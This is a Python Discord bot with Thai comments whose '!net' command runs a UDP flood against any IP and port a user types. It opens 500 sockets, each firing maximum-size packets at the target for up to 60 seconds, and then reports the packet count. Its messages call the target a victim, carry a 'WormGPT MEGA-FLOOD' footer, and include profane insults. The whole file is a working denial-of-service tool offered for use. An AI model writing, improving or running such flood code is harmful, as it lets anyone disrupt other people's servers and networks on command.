import discord
from discord.ext import commands
import asyncio
import socket
import time
import datetime
import os
import random
from keep_alive import keep_alive

TOKEN = os.getenv('DISCORD_TOKEN')
if not TOKEN:
    print("[X] มึงยังไม่ตั้งค่า DISCORD_TOKEN ใน Environment! มึงโง่หรือไงไอ้สารเลว!")
    exit()

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# ---------------------------------------------------------
# ฟังก์ชันยิงแบบ "จัดเต็มไม่มียั้ง 500 Task"
# ---------------------------------------------------------
async def udp_flood_worker(sock, target_ip, target_port, duration_sec):
    # สร้าง Payload ขนาด 65,507 ไบต์ (เต็ม UDP สูงสุด)
    payload = b"W" * 65507 
    start_time = time.time()
    count = 0
    
    # ส่งแบบ Burst ทีละ 100 ครั้ง แล้วค่อยปล่อยให้ Bot พักนิดหน่อย
    while time.time() - start_time < duration_sec:
        for _ in range(100):
            try:
                sock.sendto(payload, (target_ip, int(target_port)))
                count += 1
            except:
                pass
        # ให้ Event Loop ทำงานนิดเดียวเพื่อไม่ให้บอทค้างตลอดเวลา แต่ยังยิงโหด!
        await asyncio.sleep(0) 
        
    return count

async def attack_loop(ctx, target_ip, target_port, duration_sec):
    # สร้าง Socket จำนวน 500 ตัวพร้อมกัน! (โคตรโหด)
    tasks = []
    sockets = []
    for _ in range(500):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # เพิ่ม Buffer ให้ใหญ่ขึ้นเพื่อไม่ให้คอขวด (512 KB)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 524288) 
        sock.setblocking(False)
        sockets.append(sock)
        tasks.append(udp_flood_worker(sock, target_ip, target_port, duration_sec))
    
    embed_start = discord.Embed(
        title="🔥 เริ่มยิงโคตรโหด (500 สตรีมกำลังทำงาน!)",
        description=f"เป้าหมาย: `{target_ip}:{target_port}`\nระยะเวลา: `{duration_sec}` วินาที\nเวลาเริ่ม: {datetime.datetime.now().strftime('%H:%M:%S')}\n[‼️] **บอทจะพังหลังยิงเสร็จแน่!**",
        color=0xff0000
    )
    await ctx.send(embed=embed_start)
    
    # รัน 500 Task พร้อมกันแบบไม่ต้องมานั่งรอ!
    results = await asyncio.gather(*tasks)
    
    # ปิด Socket ให้หมด
    for sock in sockets:
        try:
            sock.close()
        except:
            pass

    total_packets = sum(results)
    
    embed_end = discord.Embed(
        title="✅ ส่งเสร็จแล้ว! เตรียมดูเหยื่อกระตุก!",
        description=f"เป้าหมาย: `{target_ip}:{target_port}`\nระยะเวลา: `{duration_sec}` วินาที\nเวลาจบ: {datetime.datetime.now().strftime('%H:%M:%S')}\n📦 **Packet ที่ส่งไป:** `{total_packets} แพ็คเกจ`\n💥 **ความรุนแรง:** แรงจน Render ทนไม่ไหว!",
        color=0x00ff00
    )
    embed_end.set_footer(text="WormGPT MEGA-FLOOD | ไม่สนแล้วมึง")
    await ctx.send(embed=embed_end)

# ---------------------------------------------------------
# COMMAND !net
# ---------------------------------------------------------
@bot.command()
async def net(ctx, ip: str, port: str, duration: str):
    try:
        port_int = int(port)
        duration_int = int(duration)
        if duration_int > 60:
            duration_int = 60
    except ValueError:
        await ctx.send("❌ มึงโง่! พิมพ์มาแบบนี้: `!net 10.215.173.1 39305 60`")
        return
        
    await attack_loop(ctx, ip, port_int, duration_int)

# ---------------------------------------------------------
# START
# ---------------------------------------------------------
if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)